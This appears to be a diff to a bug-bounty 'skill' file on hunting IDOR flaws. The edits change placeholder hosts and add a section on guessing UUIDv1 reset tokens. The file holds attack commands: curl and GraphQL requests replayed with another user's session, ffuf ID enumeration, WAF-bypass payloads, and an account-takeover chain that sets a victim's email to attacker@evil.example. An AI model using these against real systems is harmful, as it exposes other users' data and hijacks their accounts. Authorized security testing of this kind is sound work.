@@ -1,7 +1,7 @@
 ---
 name: hunt-idor
 description: Hunting skill for idor vulnerabilities. Built from 26 public bug bounty reports. Use when hunting idor on any target.
-sources: github, hackerone_public
+sources: github, hackerone_public, rfc_9562
 report_count: 39
 ---
 
@@ -129,18 +129,18 @@ state.currentUser.organizationId
 ```bash
 # Get User A's resource ID while authenticated as A
 curl -s -H "Cookie: session=USER_A_SESSION" \
-  https://target.com/api/v1/invoices/12345
+  https://target.example/api/v1/invoices/12345
 
 # Replay with User B's session
 curl -s -H "Cookie: session=USER_B_SESSION" \
-  https://target.com/api/v1/invoices/12345
+  https://target.example/api/v1/invoices/12345
 
 # Success = 200 OK with User A's data
 ```
 
 **GraphQL IDOR test:**
 ```bash
-curl -s -X POST https://target.com/graphql \
+curl -s -X POST https://target.example/graphql \
   -H "Authorization: Bearer USER_B_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
@@ -148,7 +148,7 @@ curl -s -X POST https://target.com/graphql \
 
 **Enumerate sequential IDs with ffuf:**
 ```bash
-ffuf -u "https://target.com/api/v1/orders/FUZZ" \
+ffuf -u "https://target.example/api/v1/orders/FUZZ" \
   -w ids.txt \
   -H "Authorization: Bearer USER_B_TOKEN" \
   -mc 200 \
@@ -167,7 +167,7 @@ with open("ids.txt", "w") as f:
 **Burp Intruder payload for IDOR scanning:**
 ```
 GET /api/messages/§12345§ HTTP/1.1
-Host: target.com
+Host: target.example
 Authorization: Bearer USER_B_TOKEN
 
 # Mark §12345§ as injection point
@@ -178,11 +178,11 @@ Authorization: Bearer USER_B_TOKEN
 **JavaScript scraping for leaked IDs:**
 ```bash
 # Find IDs in JS bundles
-curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u
+curl -s https://target.example/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u
 
 # Find object references in API responses
 curl -s -H "Cookie: session=USER_A" \
-  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
+  https://target.example/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
 ```
 
 **Grep patterns for source code review:**
@@ -204,7 +204,7 @@ for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
   echo "=== $method ==="
   curl -s -X $method \
     -H "Authorization: Bearer USER_B_TOKEN" \
-    https://target.com/api/v1/users/USER_A_ID/profile
+    https://target.example/api/v1/users/USER_A_ID/profile
 done
 ```
 
@@ -279,6 +279,29 @@ done
 
 **Defense: Parameter filtering/WAF on common patterns**
 - Bypass: Try nested JSON `{"data": {"id": "VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, or parameter name variations `user_id`, `userId`, `uid`, `account`
+
+---
+
+## UUID Sandwich (predictable UUIDv1 identifiers)
+
+When an unguessable UUID is the *only* guard on an action (a password-reset or invite token), a **predictable UUID version turns it guessable**. RFC 9562 is explicit: implementations "SHOULD NOT assume that UUIDs are hard to guess" and they "MUST NOT be used as security capabilities (identifiers whose mere possession grants access)." Read the UUID layout first — `xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx`, where `M` is the version nibble and `N` the variant:
+
+- **v1** = 60-bit timestamp + 14-bit clock sequence + 48-bit node (often a MAC). Predictable: across a short burst only the low timestamp bits move; clock-seq and node stay constant.
+- **v6** is field-compatible with v1 (timestamp reordered for DB locality), so it carries the same structure; RFC 9562 says v6 clock-seq/node *should* be pseudorandom, but legacy generators reuse v1 behaviour.
+- **v4** = 122 random bits and **v7** has improved entropy — not bracketable unless the generator's PRNG is weak.
+
+**The sandwich.** If reset/invite tokens are UUIDv1, bracket the target's token between two you trigger yourself:
+1. Request a reset for an account **you own** → record UUID A.
+2. Immediately request one for the middle account, then a second account **you own** → record UUID C.
+3. The middle token's timestamp falls between A and C. Only the time-low hex field differs; node + clock-seq are identical across all three. The candidate space is the hex range `A < x < C`.
+
+```python
+# Offline: how wide is the bracket? (decode-and-count, no requests)
+a, c = 0x99874128, 0x998796b4          # time-low of your two observed v1 UUIDs
+print("candidates:", c - a)            # the whole finding is: is this range small?
+```
+
+> **Safety — read-only enumeration, but do it on yourself.** Use **three tester-owned accounts**; the middle one is your own stand-in "victim". Most of the proof is **offline**: decode the two v1 timestamps, show the shared clock-sequence and node, and compute the bracket width. Live confirmation runs **only against your own middle token**: serial, a named delay (1 request / 2s with jitter), a hard cap (e.g. 2,000 candidates), and stop on the first hit. Never run the bracketing against a real third party's reset flow. Tools: the `sandwich` candidate generator and Burp's UUID Detector extension flag version/variant — verify the current repo/BApp URL before citing either.
 
 ---
 
@@ -383,7 +406,7 @@ Cross-references:
 ## Related Skills & Chains
 
 - **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
-- **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
+- **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.example` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
 - **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
 - **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.
